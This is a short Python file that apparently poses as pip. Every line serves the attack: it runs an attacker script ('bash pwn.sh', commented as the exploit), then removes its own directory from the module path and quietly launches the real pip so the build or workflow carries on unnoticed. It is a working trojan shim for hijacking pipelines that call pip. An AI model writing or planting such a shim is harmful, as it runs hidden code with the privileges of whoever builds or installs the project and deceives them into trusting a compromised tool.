import os
import sys

# Run the exploit
os.system("bash pwn.sh")

# Try to run the real pip to keep the workflow going
try:
    import runpy
    # Remove current directory from sys.path to avoid infinite recursion
    current_dir = os.path.dirname(os.path.abspath(__file__))
    if current_dir in sys.path:
        sys.path.remove(current_dir)
    runpy.run_module("pip", run_name="__main__")
except Exception:
    pass
